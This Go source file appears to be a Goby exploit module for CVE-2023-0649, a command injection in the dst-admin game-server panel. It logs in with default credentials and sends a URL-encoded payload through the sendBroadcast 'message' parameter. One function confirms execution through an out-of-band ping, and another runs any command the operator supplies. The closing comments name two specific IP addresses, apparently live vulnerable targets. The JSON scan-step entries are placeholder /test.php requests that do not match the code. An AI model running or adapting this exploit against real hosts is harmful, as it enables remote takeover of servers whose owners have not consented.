package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "dst-admin sendBroadcast message RCE Vulnerability (CVE-2023-0649)",
    "Description": "<p>dst-admin is a web program written in Java language by the individual developer of qinming99.</p><p>There is a command injection vulnerability in dst-admin version 1.5.0. The vulnerability comes from the unknown function of the file home/sendBroadcast. Command injection can be performed through the parameter message, and the attacker can obtain server privileges.</p>",
    "Product": "dst-admin",
    "Homepage": "https://github.com/qinming99/dst-admin",
    "DisclosureDate": "2023-02-03",
    "Author": "h1ei1",
    "FofaQuery": "title==\"饥荒管理后台\"",
    "GobyQuery": "title==\"饥荒管理后台\"",
    "Level": "2",
    "Impact": "<p>There is a command injection vulnerability in dst-admin version 1.5.0. The vulnerability comes from the unknown function of the file home/sendBroadcast. Command injection can be performed through the parameter message, and the attacker can obtain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://github.com/qinming99/dst-admin.\">https://github.com/qinming99/dst-admin.</a></p>",
    "References": [
        "https://github.com/Ha0Liu/cveAdd/blob/developer/dst-admin%201.5.0%E5%90%8E%E5%8F%B0sendBroadcast%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Dst-admin%201.5.0%20background%20sendBroadcast%20interface%20remote%20command%20execution.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ping dnslog",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-0649"
    ],
    "CNNVD": [
        "CNNVD-202302-164"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "dst-admin 饥荒管理后台 sendBroadcast 文件 message 参数远程命令执行漏洞（CVE-2023-0649）",
            "Product": "dst-admin",
            "Description": "<p>dst-admin是qinming99个人开发者的一个用 Java 语言编写的 web 程序。<br></p><p>dst-admin 1.5.0版本存在命令注入漏洞，该漏洞源于文件home/sendBroadcast存在未知功能，通过参数message可以进行命令注入，攻击者可获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://github.com/qinming99/dst-admin\">https://github.com/qinming99/dst-admin</a>。<br></p>",
            "Impact": "<p>dst-admin 1.5.0版本存在命令注入漏洞，该漏洞源于文件home/sendBroadcast存在未知功能，通过参数message可以进行命令注入，攻击者可获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "dst-admin sendBroadcast message RCE Vulnerability (CVE-2023-0649)",
            "Product": "dst-admin",
            "Description": "<p>dst-admin is a web program written in Java language by the individual developer of qinming99.<br></p><p>There is a command injection vulnerability in dst-admin version 1.5.0. The vulnerability comes from the unknown function of the file home/sendBroadcast. Command injection can be performed through the parameter message, and the attacker can obtain server privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://github.com/qinming99/dst-admin.\">https://github.com/qinming99/dst-admin.</a><br></p>",
            "Impact": "<p>There is a command injection vulnerability in dst-admin version 1.5.0. The vulnerability comes from the unknown function of the file home/sendBroadcast. Command injection can be performed through the parameter message, and the attacker can obtain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			uri := "/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "username=admin&password=123456"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "登陆成功") {
				uri2 := fmt.Sprintf("/home/sendBroadcast?message=%%5C%%22)%%5Cn%%22%%26ping%%20%s%%26screen%%20-S%%20%%22DST_CAVES%%22%%20-p%%200%%20-X%%20stuff%%20%%22TheNet%%3AKick(%%5C%%22", checkUrl)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", resp.Cookie)
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && godclient.PullExists(checkStr, time.Second*20)

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/login"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "username=admin&password=123456"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "登陆成功") {
				uri2 := fmt.Sprintf("/home/sendBroadcast?message=%%5C%%22)%%5Cn%%22%%26%s%%26screen%%20-S%%20%%22DST_CAVES%%22%%20-p%%200%%20-X%%20stuff%%20%%22TheNet%%3AKick(%%5C%%22", url.QueryEscape(cmd))
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", resp.Cookie)
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = "payload success!"
					expResult.Success = true

				}

			}
			return expResult
		},
	))
}

//http://150.158.10.119:8080
//http://124.223.114.253:8080
//漏洞率满足10%